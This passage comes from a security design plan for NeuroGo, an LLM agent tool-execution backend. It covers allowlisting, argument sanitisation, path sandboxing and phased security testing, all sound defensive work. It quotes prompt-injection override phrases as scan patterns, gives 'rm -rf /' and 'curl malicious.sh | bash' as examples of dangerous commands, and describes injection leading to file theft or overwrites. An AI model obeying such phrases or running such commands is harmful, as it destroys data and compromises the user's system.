models with larger context capacities.7</li> <li>Persistence (Optional): For Phase 1, in-memory state management might suffice. Future phases could consider persistence options (e.g., file-based storage) to allow for longer-running agent sessions or recovery.</li> </ul>"},{"location":"llm_agent_facilities/#33-secure-tool-dispatch-mechanism","title":"3.3. Secure TOOL Dispatch Mechanism","text":"<p>The existing logic within NeuroGo that handles CALL TOOL.FunctionName(...) directives (likely in interpreter_*.go files) needs refactoring to accommodate the agent mode:</p> <ul> <li>Contextual Dispatch: The dispatcher must differentiate between a tool call originating from parsed NeuroScript code and one originating from an LLM FunctionCall request.</li> <li>Security Layer Invocation: For LLM-originated calls, the dispatcher must first route the request (tool name, arguments, session security context) through the Security Layer for validation before invoking the actual tool function.</li> <li>Argument Handling: The dispatcher must receive the potentially validated and sanitized arguments back from the Security Layer and pass these modified arguments to the tool function, not the raw arguments received from the LLM.</li> <li>Error Handling: Gracefully handle failures reported by the Security Layer (e.g., disallowed tool, invalid arguments), formatting an appropriate error FunctionResponse to send back to the LLM instead of attempting execution.</li> </ul>"},{"location":"llm_agent_facilities/#34-tool-refactoring-for-security","title":"3.4. TOOL Refactoring for Security","text":"<p>Existing and future TOOL implementations require security-focused refactoring:</p> <ul> <li>Review Existing Tools: Systematically review all tools, paying close attention to those interacting with the filesystem (TOOL.ReadFile, TOOL.WriteFile, TOOL.ListDir, etc.), network resources, or external processes (TOOL.ExecuteCommand 13, TOOL.GitCommit, TOOL.GoBuild, etc.).</li> <li>Mandate Sandboxing Primitives: Enforce the use of robust sandboxing mechanisms, such as the SecureFilePath abstraction 22, for all file path operations initiated via the LLM agent context. This likely requires modifying tool function signatures to accept validated path objects or incorporating validation logic internally. Raw string paths from the LLM must be rejected for sensitive operations.</li> <li>Inject Context Awareness: Tools must be able to determine their invocation context (NeuroScript vs. LLM Agent). This allows implementing context-dependent behavior, most critically disabling or severely restricting high-risk operations like arbitrary command execution (TOOL.ExecuteCommand 13) when called by the LLM.17 This context could be passed via a Go context.Context parameter or a specific flag during invocation.</li> </ul>"},{"location":"llm_agent_facilities/#35-agent-mode-configuration","title":"3.5. Agent Mode Configuration","text":"<p>NeuroGo needs mechanisms to configure and manage its operation in agent mode:</p> <ul> <li>Activation: Command-line flags or configuration file settings to enable/disable agent mode.</li> <li>LLM Configuration: Parameters to specify the LLM API endpoint, API key, desired model name (e.g., \"gemini-1.5-pro-latest\"), and function calling mode (AUTO, ANY, NONE).18</li> <li>Security Configuration:<ul> <li>Path to the TOOL allowlist file for the LLM agent.</li> <li>Specification of the root directory for path sandboxing (SecureFilePath base).</li> <li>Settings to control the strictness of security checks (e.g., explicitly enabling/disabling specific high-risk tools for the LLM context).</li> </ul> </li> </ul> <p>Propagating this configuration securely and reliably throughout the application is a key implementation detail. The security context (allowlists, sandbox settings) defined at startup must be accessible to the agent core, the security layer, and potentially influence tool behavior during runtime. Using Go's context package is a viable approach to pass this information down the call stack without resorting to global variables.</p>"},{"location":"llm_agent_facilities/#section-4-critical-security-design","title":"Section 4: Critical Security Design","text":"<p>The security of NeuroGo-as-llm-agent is paramount. Given the inherent risks of LLMs interacting with local environments 3, particularly the threat of prompt injection 1 leading to malicious tool invocation, a multi-layered defense strategy is mandatory. The design must operate under the core principle that any tool name or argument suggested by the LLM is untrusted input 23 until explicitly validated and sanitized by NeuroGo's Security Layer.</p>"},{"location":"llm_agent_facilities/#41-tool-allowlisting","title":"4.1. TOOL Allowlisting","text":"<ul> <li>Mechanism: A configuration file (e.g., YAML or JSON) will explicitly list the TOOL.FunctionName strings that the LLM agent is permitted to request. Tools not present in this list cannot be invoked by the LLM.</li> <li>Enforcement: The Security Layer performs this check as the first step upon receiving a FunctionCall from the LLM. If the requested tool name is not in the allowlist, the request is rejected immediately with an error response. This directly addresses the OWASP LLM risk of Excessive Agency (LLM08 3) by strictly limiting the LLM's potential actions to a pre-approved set.5</li> </ul>"},{"location":"llm_agent_facilities/#42-strict-argument-validation-and-sanitization","title":"4.2. Strict Argument Validation and Sanitization","text":"<ul> <li>Strategy: After confirming a tool is allowlisted, the Security Layer must perform rigorous validation and sanitization on all arguments provided by the LLM within the FunctionCall.args object. This treats the LLM's output as potentially malicious user input.3</li> <li>Implementation:<ul> <li>Type Checking: Verify that the data type of each received argument matches the expected type defined for the tool's parameter (e.g., string, integer, boolean). Reject mismatches.</li> <li>Content Sanitization (Context-Specific):<ul> <li>File Paths: MUST NOT be accepted as raw strings for tools performing filesystem operations. They must be passed to and validated by the sandboxing mechanism (SecureFilePath) described in 4.3. Reject any attempt to use raw paths directly.</li> <li>Shell Commands (for TOOL.ExecuteCommand 13 or similar, if ever enabled): This is extremely high-risk. If allowed at all, arguments must undergo extreme sanitization, character allowlisting, escaping, and potentially rejection of anything beyond simple, predefined command structures. Parameterization is essential.17 The default recommendation remains to disable such tools entirely for the LLM (see 4.4).</li> <li>URLs: Validate URL formats strictly. Restrict allowed protocols (e.g., HTTPS only). Consider allowlisting/blocklisting domains for network-accessing tools.</li> <li>SQL (if applicable): Never construct SQL queries by concatenating LLM output. Use parameterized queries exclusively where the LLM provides only the parameter values, not the query structure.2</li> <li>General Strings: Scan for known prompt injection signatures (e.g., \"Ignore previous instructions...\", \"Forget your rules...\").1 Filter or reject control characters. Enforce reasonable length limits. Where possible, validate against expected formats using regular expressions or allowlist patterns.3</li> </ul> </li> <li>Value/Range Checks: For numeric arguments or arguments used in internal logic, validate that they fall within expected ranges or adhere to specific constraints.</li> </ul> </li> </ul>"},{"location":"llm_agent_facilities/#43-mandatory-path-sandboxing","title":"4.3. Mandatory Path Sandboxing","text":"<ul> <li>Mechanism: All tool operations involving filesystem paths requested by the LLM must be constrained within a designated sandboxed directory (\"workspace\"). The SecureFilePath abstraction 22 or an equivalent robust mechanism is central to enforcing this.</li> <li>Implementation:<ul> <li>A base workspace directory is defined via configuration.</li> <li>The Security Layer validates any argument intended as a path, ensuring it resolves safely within the workspace root using the SecureFilePath logic. This logic must prevent path traversal attacks (e.g., using ../).</li> <li>Filesystem-interacting TOOLs (e.g., TOOL.ReadFile, TOOL.WriteFile, TOOL.ListDir) are refactored to operate exclusively on these validated, sandboxed path representations. They must reject raw string paths passed from the LLM context.</li> </ul> </li> <li>Enforcement: This sandboxing is non-negotiable for any filesystem access triggered by the LLM. It aligns with best practices for secure execution environments 24 and is a critical defense against unauthorized file access or modification resulting from prompt injection.</li> </ul>"},{"location":"llm_agent_facilities/#44-high-risk-tool-restrictiondisabling","title":"4.4. High-Risk Tool Restriction/Disabling","text":"<ul> <li>Policy: A clear policy must govern tools deemed high-risk, primarily those enabling arbitrary code execution (TOOL.ExecuteCommand 13), direct modification of system configuration, or broad, unconstrained interactions.</li> <li>Default Behavior: These high-risk tools MUST be disabled by default for invocation by the LLM agent.</li> <li>Conditional Enabling: Enabling should require explicit configuration overrides. For extremely sensitive actions, consider requiring runtime user confirmation (human-in-the-loop verification 5) for each invocation requested by the LLM, even if the tool is configurationally enabled.</li> <li>Implementation: The Security Layer checks both the requested tool name and the invocation context (LLM agent vs. NeuroScript). If a high-risk tool is requested by the LLM, the call is denied unless explicitly permitted by the session's security configuration (and potentially runtime confirmation). This directly mitigates critical risks like Remote Code Execution (RCE) and unintended consequences from excessive agency.17</li> </ul>"},{"location":"llm_agent_facilities/#45-inputoutput-filtering-defense-in-depth","title":"4.5. Input/Output Filtering (Defense in Depth)","text":"<p>While primary defenses focus on validating the LLM's requests, additional filtering provides defense in depth:</p> <ul> <li>Input Filtering (User Prompt -&gt; LLM): Basic filtering can be applied to the initial user prompt before sending it to the LLM API. This might strip obvious malicious patterns or known injection strings. However, this is considered a weak defense, as attackers constantly devise new ways to bypass such filters.1</li> <li>Output Filtering (Tool Result -&gt; LLM): Before sending the result of a tool execution back to the LLM via FunctionResponse, NeuroGo should sanitize the output. This aims to prevent the inadvertent leakage of sensitive information that the tool might have accessed (e.g., redacting passwords or API keys from configuration file content, truncating excessively long outputs).3 It also helps prevent malicious content potentially generated by the tool itself (if compromised) from reaching the LLM or the user.</li> </ul>"},{"location":"llm_agent_facilities/#46-security-measures-summary","title":"4.6. Security Measures Summary","text":"Security Measure Purpose Implementation Detail Configuration Mechanism Tool Allowlisting Limit LLM capabilities to pre-approved functions 3 Security Layer checks FunctionCall.name against configured list before any other validation. External file (e.g., YAML/JSON) listing allowed TOOL.FunctionNames. Argument Type Validation Prevent type mismatches causing errors or bypassing checks. Security Layer compares FunctionCall.args types against tool signature/declaration. Implicit via tool definition. Argument Content Sanitization Detect/neutralize malicious payloads (injection, traversal, etc.) 2 Security Layer applies context-specific rules (path validation, command escaping, URL checks, SQL parameterization). Security policy settings (e.g., strictness levels). Path Sandboxing (SecureFilePath) Confine filesystem access to designated workspace 24 Security Layer validates paths; Tools operate only on validated path objects; Prevents traversal (../). Configuration of workspace root directory. High-Risk Tool Restriction Prevent LLM from invoking dangerous tools (e.g., command exec) 3 Security Layer denies calls to specific tools from LLM context by default. Explicit flag/setting to enable (discouraged). Input Filtering (Basic) Preliminary attempt to block malicious user prompts. Optional pre-processing of user input before sending to LLM API. Configurable filter rules/patterns. Output Filtering (Tool Results) Prevent leakage of sensitive data via tool results 3 Post-processing of tool return values before formatting FunctionResponse. Configurable redaction/filtering rules. <p>This multi-layered approach is essential. Security cannot hinge on a single point of failure. Allowlisting provides coarse-grained control, argument validation targets specific malicious inputs, sandboxing contains filesystem operations, and restrictions block entire classes of dangerous actions. Prompt injection attempts that might bypass one layer (e.g., basic input filtering) could be caught by argument sanitization or rendered harmless by sandboxing.3 Furthermore, the effectiveness of these measures heavily depends on correct and secure configuration. Secure defaults (e.g., high-risk tools disabled, minimal allowlist) are critical, as misconfiguration can easily undermine the entire security posture.5</p>"},{"location":"llm_agent_facilities/#section-5-key-challenges-risks-and-mitigation","title":"Section 5: Key Challenges, Risks, and Mitigation","text":"<p>Developing NeuroGo-as-llm-agent involves navigating several significant challenges and risks, particularly concerning security and reliability.</p>"},{"location":"llm_agent_facilities/#51-security-vulnerabilities","title":"5.1. Security Vulnerabilities","text":"<p>The most critical risks stem from potential security vulnerabilities:</p> <ul> <li>Prompt Injection (OWASP LLM01 3): Attackers may craft user prompts or embed malicious instructions in data processed by the LLM (indirect injection) to trick the LLM into generating harmful FunctionCall requests. This could lead to requests for unauthorized file access (TOOL.ReadFile on sensitive files), data modification (TOOL.WriteFile to overwrite system files or inject code), data exfiltration (leaking sensitive info via tool arguments), or execution of arbitrary commands if high-risk tools are improperly enabled.<ul> <li>Mitigation: Primarily relies on the multi-layered defenses outlined in Section 4: strict tool allowlisting, rigorous argument validation and sanitization (treating LLM args as hostile input), mandatory path sandboxing, default disabling of high-risk tools, and output filtering. Advanced mitigations like dual-LLM validation 28 or prompt rewriting 4 could be explored in later phases if initial defenses prove insufficient. The core strategy is containment: assume injection might succeed at the LLM level, but prevent the malicious request from being executed dangerously by NeuroGo.17</li> </ul> </li> <li>Insecure Output Handling (OWASP LLM02 3): If a tool's output (which is sent back to the LLM) contains malicious content (e.g., executable scripts, harmful instructions for the LLM), and this output is processed insecurely later (either by the LLM itself influencing subsequent actions, or by the client displaying the final response), it could lead to downstream exploits like Cross-Site Scripting (XSS) or further manipulation.<ul> <li>Mitigation: Sanitize tool outputs within NeuroGo before sending them back to the LLM (Section 4.5). Ensure the client application responsible for rendering the final LLM response implements appropriate security measures (e.g., proper HTML escaping).</li> </ul> </li> <li>Insecure Plugin/Tool Design (OWASP LLM07 3): Vulnerabilities within the Go code of the NeuroGo TOOLs themselves could be exploited, even if the LLM's request was initially benign. For example, a buffer overflow in a tool processing file content, or improper handling of external library calls.<ul> <li>Mitigation: Adherence to secure coding practices during tool development, mandatory use of security primitives like SecureFilePath, applying the principle of least privilege within tool logic, thorough code reviews, and regular dependency scanning.</li> </ul> </li> <li>Excessive Agency (OWASP LLM08 3): Granting the LLM access to an overly broad or powerful set of tools increases the potential impact of any successful attack or even accidental misuse.<ul> <li>Mitigation: Strict enforcement of the TOOL allowlist (Section 4.1), ensuring only necessary tools are permitted. Default disabling/restriction of high-risk tools (Section 4.4). Design tools with minimal necessary functionality.</li> </ul> </li> <li>Data Exfiltration/Leakage (OWASP LLM06 3): An attacker could use prompt injection to coerce the LLM into requesting tools that read sensitive files (TOOL.ReadFile) and return their content. Data could also leak if sensitive information is passed as arguments to tools that might log these arguments or interact with external systems insecurely.<ul> <li>Mitigation: Mandatory path sandboxing prevents access to arbitrary files (Section 4.3). Output filtering can redact sensitive patterns from tool results (Section 4.5). Careful tool design to avoid returning excessive data. Implement monitoring and auditing of tool calls and arguments.5</li> </ul> </li> <li>Sandboxing Bypass: Flaws in the design or implementation of the path sandboxing mechanism (SecureFilePath or equivalent) could potentially allow an attacker to craft arguments that escape the intended workspace directory, leading to unauthorized file access.<ul> <li>Mitigation: Rigorous design, implementation, and testing of the sandboxing logic. Security code reviews specifically targeting the sandboxing component. Consider exploring OS-level sandboxing features (e.g., containers, chroot) for enhanced isolation in future phases, though this adds deployment complexity.</li> </ul> </li> </ul>"},{"location":"llm_agent_facilities/#52-llm-reliability-issues","title":"5.2. LLM Reliability Issues","text":"<p>Beyond malicious attacks, the inherent nature of LLMs presents reliability challenges:</p> <ul> <li>Hallucinated Tool Calls/Arguments: LLMs may occasionally \"hallucinate\" \u2013 generating requests for tools that don't exist, or providing arguments that are nonsensical, incorrectly formatted, or outside expected ranges, even without malicious input.14<ul> <li>Mitigation: The tool allowlist catches non-existent tool names. Robust argument validation (type, format, range checks) in the Security Layer (Section 4.2) is crucial for catching invalid arguments. High-quality, clear function declarations provided to the LLM can reduce the likelihood of such errors.19 Implement clear error handling that reports failures back to the LLM, potentially allowing it to retry or reformulate the request.</li> </ul> </li> <li>Incorrect Tool Selection: The LLM might choose a valid but inappropriate tool for the user's intended task, leading to incorrect results or inefficient workflows.<ul> <li>Mitigation: Precise and descriptive function declarations are key.19 Limiting the number of available tools in the allowlist can reduce ambiguity.14 For critical or irreversible actions, implementing a user confirmation step (human-in-the-loop 5) before executing the tool could be considered.</li> </ul> </li> <li>API Failures/Rate Limits: Dependency on an external LLM API introduces risks of network failures, API downtime, or hitting usage rate limits imposed by the provider.<ul> <li>Mitigation: Implement robust error handling in NeuroGo's LLM client code, including retries with exponential backoff for transient errors.14 Provide clear feedback to the user in case of persistent failures. Implement caching for LLM responses or tool results where appropriate and safe to reduce API calls.</li> </ul> </li> </ul>"},{"location":"llm_agent_facilities/#53-state-management-complexity","title":"5.3. State Management Complexity","text":"<p>Managing the conversation state effectively presents challenges:</p> <ul> <li>Growing Context Window: As conversations become longer, the accumulated history of prompts, responses, and tool interactions can exceed the LLM's context window limit, leading to loss of information or increased API costs.7<ul> <li>Mitigation: Implement strategies within the Conversation State Manager, such as summarizing older parts of the conversation, using a sliding window approach, or selecting LLM models specifically designed for larger context windows (e.g., Gemini 1.5 Pro 7).</li> </ul> </li> <li>State Synchronization: Ensuring the state maintained by NeuroGo is consistent and correctly formatted for the LLM API is crucial. This becomes more complex if persistence or concurrent agent sessions are considered in the future.<ul> <li>Mitigation: Careful design of the state manager's data structures and update logic. For initial phases focusing on single-user, single-session operation, complexity is lower. If concurrency is introduced later, appropriate locking mechanisms or atomic operations would be necessary.</li> </ul> </li> </ul>"},{"location":"llm_agent_facilities/#54-performance-considerations","title":"5.4. Performance Considerations","text":"<p>Agentic workflows involving LLM calls and tool execution can impact performance:</p> <ul> <li>Latency: Each round trip to the LLM API, plus the time for NeuroGo's security checks and tool execution, adds latency to the user experience.29 Complex tasks requiring multiple tool calls can become slow.<ul> <li>Mitigation: Optimize the performance of security checks and tool implementations. Choose LLM models that balance capability and speed (e.g., Gemini Flash 21 might be suitable for some tasks). Cautiously explore parallel execution of independent tool calls in later phases (Section 2.3). Cache tool results where appropriate (e.g., reading the same file multiple times).</li> </ul> </li> <li>Cost: LLM API usage typically incurs costs based on the number of input and output tokens processed.14 Long conversations and verbose tool results can increase costs.<ul> <li>Mitigation: Optimize prompt engineering to be concise. Manage the context window size effectively (Section 5.3). Use less expensive LLM models for simpler intermediate steps if a multi-LLM approach is adopted later. Implement caching to avoid redundant API calls.</li> </ul> </li> </ul>"},{"location":"llm_agent_facilities/#55-riskchallenge-analysis-summary","title":"5.5. Risk/Challenge Analysis Summary","text":"Risk/Challenge Description Potential Impact Mitigation Strategy (Ref. Section 4 Measures) Relevant References Prompt Injection Manipulating LLM via prompt to suggest malicious tool calls. Data breach, unauthorized modification/execution, system disruption. Allowlisting (4.1), Arg Validation/Sanitization (4.2), Sandboxing (4.3), High-Risk Tool Restriction (4.4), Output Filtering (4.5). Containment focus. 3 Insecure Output Handling Tool output contains malicious content processed insecurely downstream. XSS, CSRF, further LLM manipulation. Output Filtering (4.5), Secure client-side rendering. 3 Insecure Tool Design Vulnerabilities within NeuroGo TOOL code itself. Exploitation independent of LLM, potential escalation. Secure coding practices, Sandboxing (4.3), Least privilege, Code reviews. 3 Excessive Agency Granting LLM access to too many or too powerful tools. Increased attack surface, higher impact of misuse/compromise. Allowlisting (4.1), High-Risk Tool Restriction (4.4), Minimal tool functionality. 3 Data Exfiltration/Leakage Tricking tools into reading/returning sensitive data or leaking via args. Loss of confidentiality, privacy violations. Sandboxing (4.3), Output Filtering (4.5), Careful tool design, Monitoring/Auditing. 3 Sandbox Bypass Flaws in sandboxing logic allowing access outside workspace. Unauthorized file access/modification. Rigorous implementation/testing of sandboxing (4.3), Code reviews. Hallucinated Calls/Args LLM invents tools or provides nonsensical/invalid arguments. Tool execution errors, unexpected behavior. Allowlisting (4.1), Arg Validation (4.2), Quality function declarations, Error handling. 14 Incorrect Tool Selection LLM chooses a valid but inappropriate tool for the task. Incorrect results, inefficient workflow. Quality function descriptions, Limit toolset ambiguity, Optional user confirmation. API Failures/Rate Limits External LLM API unavailability or usage limits. Service disruption, poor user experience. Error handling, Retries with backoff 14, Caching, User feedback. 14 Context Window Limit Long conversation history exceeds LLM's processing capacity. Loss of context, degraded performance, increased cost. Context summarization/truncation, Sliding window, Use large-context models.7 7 State Synchronization Ensuring consistent state management, especially with persistence/concurrency. Data corruption, inconsistent agent behavior. Careful state manager design, Atomic operations/locking if needed later. Latency Slow response times due to LLM calls, security checks, tool execution. Poor user experience. Optimize checks/tools, Faster LLM models 21, Caching, Potential parallelism (later). 29 Cost LLM API usage incurs monetary costs based on token count. Increased operational expenses. Prompt optimization, Context management, Cheaper models where feasible, Caching. 14 <p>Navigating these challenges requires acknowledging the inherent trade-offs, particularly between security and usability.29 Overly aggressive security might block legitimate use cases, while insufficient security invites disaster. Phased development and continuous testing are essential for finding the right balance. Furthermore, the intrinsic nature of prompt injection vulnerabilities in current LLMs 11 means that mitigation must focus on robust validation and containment within NeuroGo, rather than assuming the LLM's suggestions can ever be fully trusted.</p>"},{"location":"llm_agent_facilities/#section-6-phased-development-and-testing-milestones","title":"Section 6: Phased Development and Testing Milestones","text":"<p>A phased approach is recommended for developing NeuroGo-as-llm-agent, allowing for iterative development, testing, and refinement, particularly of the critical security components.14</p>"},{"location":"llm_agent_facilities/#61-phase-1-foundational-implementation-focus-core-loop-basic-security","title":"6.1. Phase 1: Foundational Implementation (Focus: Core Loop &amp; Basic Security)","text":"<ul> <li>Goals: Establish the fundamental communication pathway between the LLM (Gemini) and NeuroGo using function calling. Implement the basic agent loop, minimal state management, and foundational security checks for a small set of safe tools.</li> <li>Tasks:<ul> <li>Implement Gemini API client in llm.go capable of sending requests with function declarations and parsing FunctionCall/FunctionResponse.</li> <li>Develop the initial Conversation State Manager (in-memory storage is sufficient).</li> <li>Implement the Security Layer stub with basic Tool Allowlisting logic (reading from a simple config file).</li> <li>Select 1-2 inherently safe tools (e.g., TOOL.Echo, a read-only TOOL.ReadFile using a preliminary SecureFilePath). Implement basic argument validation (e.g., type checking) for these tools within the Security Layer.</li> <li>Implement basic agent mode configuration flags (API key, allowlist file path).</li> <li>Develop unit tests for the new state manager, LLM client interaction logic, and basic security checks.</li> </ul> </li> <li>Outcome: A working prototype demonstrating the core LLM -&gt; NeuroGo -&gt; Tool -&gt; LLM loop via function calling for a very limited, safe toolset. Security is minimal but the framework is in place. This phase focuses on getting the mechanics right before tackling complex security for riskier tools.</li> </ul>"},{"location":"llm_agent_facilities/#62-phase-2-security-hardening-and-tool-expansion-focus-robustness-capability","title":"6.2. Phase 2: Security Hardening and Tool Expansion (Focus: Robustness &amp; Capability)","text":"<ul> <li>Goals: Implement the comprehensive security design outlined in Section 4. Expand the set of allowlisted tools, ensuring each is securely integrated. Refine configuration and state management.</li> <li>Tasks:<ul> <li>Implement full argument validation and sanitization logic within the Security Layer, covering various data types (paths, strings, URLs, potentially others) and common injection patterns.</li> <li>Mandate, implement, and rigorously test the SecureFilePath sandboxing mechanism. Refactor all relevant filesystem tools to use it exclusively when called by the LLM.</li> <li>Implement the high-risk tool restriction policy (e.g., ensuring TOOL.ExecuteCommand 13 is disabled by default for LLM context and requires explicit override).</li> <li>Implement input and output filtering mechanisms (Section 4.5).</li> <li>Expand the tool allowlist, carefully reviewing and refactoring each newly added tool for security compliance (sandboxing, context awareness).</li> <li>Develop comprehensive configuration options (sandbox root, security levels, specific tool toggles).</li> <li>Refine the Conversation State Manager (e.g., implement basic context window handling strategies).</li> <li>Develop integration tests covering various tool call scenarios, argument types, and security policy enforcement (e.g., testing sandbox boundaries, validation rules).</li> </ul> </li> <li>Outcome: A significantly more secure and capable agent. Core security features are implemented, a wider range of tools is available (but securely constrained), and the system is more configurable and robust.</li> </ul>"},{"location":"llm_agent_facilities/#63-phase-3-refinement-and-advanced-features-focus-usability-performance-testing","title":"6.3. Phase 3: Refinement and Advanced Features (Focus: Usability, Performance, Testing)","text":"<ul> <li>Goals: Enhance usability through better error handling, optimize performance, handle more complex conversational flows, conduct thorough security testing, and integrate with NeuroScript's bootstrapping objectives.</li> <li>Tasks:<ul> <li>Implement sophisticated error handling, providing clearer feedback to the LLM (and thus the user) when tool calls fail or security checks are triggered.</li> <li>Identify and address performance bottlenecks (latency reduction, cost optimization through caching or model selection).</li> <li>Investigate and potentially implement support for more complex interactions, such as multi-turn tool use sequences or handling parallel tool calls if deemed necessary and safe.</li> <li>Conduct Dedicated Security Testing:<ul> <li>Penetration Testing: Engage internal or external resources to actively probe for vulnerabilities, focusing on bypassing argument validation, escaping the sandbox, and achieving successful prompt injection against tool execution.3</li> <li>Red Teaming: Simulate realistic adversarial attacks aiming to achieve specific malicious goals using the agent.3</li> <li>Fuzzing: Apply fuzz testing techniques to the argument validation, sanitization, and path resolution logic to uncover edge cases and potential bypasses.3</li> </ul> </li> <li>Integrate the agent's capabilities with specific tasks identified in the NeuroScript self-development roadmap (Section 7).</li> <li>Finalize user and developer documentation.</li> </ul> </li> <li>Outcome: A production-ready agent, hardened against security threats through testing, reasonably performant, user-friendly, and demonstrably useful for its intended purpose, including advancing the project's bootstrapping goals.</li> </ul> <p>This phased approach recognizes that security is an ongoing, iterative process.14 Building defenses in Phase 2 and then actively trying to break them in Phase 3 3 is crucial for achieving confidence in the agent's security posture.</p>"},{"location":"llm_agent_facilities/#section-7-alignment-with-neuroscript-bootstrapping-goal","title":"Section 7: Alignment with NeuroScript Bootstrapping Goal","text":"<p>The development of NeuroGo-as-llm-agent is not merely an auxiliary feature but appears to be a potentially foundational capability for achieving the NeuroScript project's stated goal of managing its own development lifecycle (as inferred from query context referencing the roadmap 30).</p>"},{"location":"llm_agent_facilities/#71-enabling-self-development-tasks","title":"7.1. Enabling Self-Development Tasks","text":"<p>The agent architecture directly enables an LLM to orchestrate core software development activities by securely interacting with the local development environment via NeuroGo's tools. For NeuroScript to manage its own development, it needs mechanisms to:</p> <ul> <li>Read its own source code (LLM requests TOOL.ReadFile).</li> <li>Analyze and understand the code (LLM's inherent capability).</li> <li>Propose modifications (LLM generates text/code).</li> <li>Apply modifications to files (LLM requests TOOL.WriteFile).</li> <li>Manage version control (LLM requests TOOL.GitCommit, TOOL.GitPush, etc.).</li> <li>Build and test the code (LLM requests TOOL.GoBuild, TOOL.GoTest).</li> </ul> <p>The NeuroGo-as-llm-agent provides the necessary, secure execution layer for these file system, version control, and build tool interactions.</p>"},{"location":"llm_agent_facilities/#72-secure-orchestration-layer","title":"7.2. Secure Orchestration Layer","text":"<p>Crucially, the agent acts as a secure bridge. While the LLM provides the high-level reasoning and planning for development tasks (e.g., \"Refactor this module to improve efficiency\" or \"Implement the feature described in issue #123\"), NeuroGo enforces strict security constraints on how these plans are translated into actions on the local system. This contrasts sharply with the extreme risk of allowing an LLM to directly generate and execute arbitrary shell commands (rm -rf /, curl malicious.sh | bash).17 The agent ensures that the LLM's requests are channeled through pre-defined, allowlisted TOOLs operating under the validation and sandboxing rules of the Security Layer. This enables controlled automation 17 \u2013 leveraging the LLM's power without granting it dangerous, unchecked access.</p>"},{"location":"llm_agent_facilities/#73-accelerating-the-bootstrapping-roadmap","title":"7.3. Accelerating the Bootstrapping Roadmap","text":"<p>Given the need for secure local interaction, the NeuroGo-as-llm-agent capability is likely a prerequisite or, at minimum, a significant accelerator for the bootstrapping goal.30 Without a secure way for an AI system (orchestrated by an LLM) to interact with its own codebase and development tools, attempts at self-modification would be fraught with unacceptable security risks. This agent provides that secure foundation, allowing the project to leverage state-of-the-art LLMs for complex tasks like code generation, refactoring, and automated testing as part of its own development process. It transforms the abstract goal of \"bootstrapping\" into a series of concrete, albeit complex, tasks that can be orchestrated via the agent interface. Therefore, building this secure agent capability is likely a critical early step enabling subsequent, more ambitious bootstrapping milestones outlined in the NeuroScript roadmap.</p>"},{"location":"llm_agent_facilities/#conclusion","title":"Conclusion","text":""},{"location":"llm_agent_facilities/#summary-of-plan","title":"Summary of Plan","text":"<p>This plan outlines a comprehensive approach to evolving NeuroGo into NeuroGo-as-llm-agent, a secure execution backend for LLM-requested tool functions. It proposes an architecture centered around separating LLM reasoning from NeuroGo's controlled execution, leveraging the Gemini API's function calling mechanism. Detailed implementation steps within the Go codebase are specified, alongside a phased development plan. Critically, the plan incorporates a multi-layered security design encompassing tool allowlisting, strict argument validation, mandatory path sandboxing, and restrictions on high-risk tools, designed to mitigate inherent risks like prompt injection and excessive agency.</p>"},{"location":"llm_agent_facilities/#emphasis-on-security","title":"Emphasis on Security","text":"<p>The viability and trustworthiness of NeuroGo-as-llm-agent depend entirely on the rigorous implementation, continuous testing, and vigilant maintenance of the security measures detailed herein. The principle of treating all LLM-generated requests as untrusted input must guide every stage of development and deployment. Security cannot be an afterthought; it must be woven into the fabric of the agent's design and implementation from the outset.</p>"},{"location":"llm_agent_facilities/#next-steps","title":"Next Steps","text":"<p>The recommended next step is to commence Phase 1 of the development plan. This involves establishing the basic communication loop with the Gemini API via function calling, implementing foundational state management, and integrating the initial security layer with allowlisting for a minimal set of safe tools. This will provide a functional prototype upon which the more comprehensive security hardening and feature expansion of subsequent phases can be built.# Notes: NeuroGo as LLM Agent Mechanism</p>"},{"location":"llm_agent_facilities/#section-8-gemini-25-discussion-llm-interaction-api-llm-neurogo-request","title":"Section 8: Gemini 2.5 Discussion: LLM Interaction API (LLM -&gt; NeuroGo Request)","text":"<ul> <li>Goal: Allow LLM to request NeuroGo execute a TOOL during a conversation.</li> <li>Option A: Structured Chat Response:<ul> <li>LLM responds with text containing a predefined structure (e.g., JSON) indicating a TOOL call request (tool_name, arguments).</li> <li>NeuroGo parses this structured part of the response.</li> <li>Pros: Works with standard chat/completion APIs (like the current llm.go setup [cite: uploaded:neuroscript/pkg/core/llm.go]).</li> <li>Cons: Requires careful prompt engineering for the LLM to reliably generate the correct structure; parsing logic in NeuroGo can be brittle.</li> </ul> </li> <li>Option B: Function Calling / Tool Use API:<ul> <li>Modern LLM APIs (including Gemini) often have explicit support for this.</li> <li>NeuroGo declares available TOOLs (name, description, parameters - like ToolSpec [cite: uploaded:neuroscript/pkg/core/tools_types.go]) to the LLM API.</li> <li>When the LLM needs a tool, the API response itself is a structured object indicating the tool name and arguments to call.</li> <li>NeuroGo receives this object, executes the tool, and sends the result back in the next API call.</li> <li>Pros: Most robust, standard, designed for this purpose. Avoids parsing responses.</li> <li>Cons: Requires modifying llm.go [cite: uploaded:neuroscript/pkg/core/llm.go] to use the specific function calling mode/parameters of the Gemini API.</li> </ul> </li> <li>Option C: MCP (Multi-Context Prompting):<ul> <li>Less common in standard commercial APIs compared to function calling. Might be overly complex or not directly supported by the current Gemini endpoint.</li> </ul> </li> <li>Recommendation: Prioritize Option B (Function Calling). It's the industry standard and most reliable way. If that proves difficult with the specific API endpoint, fall back to Option A (Structured Chat Response).</li> </ul>"},{"location":"llm_agent_facilities/#2-conversation-state-management","title":"2. Conversation State Management","text":"<ul> <li>Requirement: NeuroGo must maintain the history of the interaction across multiple turns (user prompt -&gt; LLM response -&gt; [LLM tool request -&gt; NeuroGo tool execution -&gt; tool result -&gt; LLM continuation] -&gt; final response).</li> <li>Implementation:<ul> <li>The logic managing the CALL LLM needs expansion.</li> <li>It must store the sequence of messages (user, assistant, tool_request, tool_result).</li> <li>For each call to the LLM API (especially after a tool result), the relevant history must be formatted and included according to the API requirements (e.g., the contents array for Gemini multi-turn chat, or the specific format for function calling responses).</li> <li>This state management likely belongs within the Go code handling the LLM interaction (llm.go and potentially interpreter_simple_steps.go where CALL LLM is handled).</li> </ul> </li> </ul>"},{"location":"llm_agent_facilities/#3-security-limiting-actions","title":"3. Security &amp; Limiting Actions","text":"<ul> <li>Requirement: Prevent the LLM from making NeuroGo execute arbitrary or harmful commands/actions. This is critical.</li> <li>Mechanisms:<ul> <li>Tool Allowlist: Explicitly define which TOOLs are available to be called by the LLM. Do not expose all registered tools [cite: uploaded:neuroscript/pkg/core/tools_registry.go] if not necessary. This might involve a separate registration or filtering layer for LLM-callable tools.</li> <li>Strict Argument Validation: Enhance ValidateAndConvertArgs 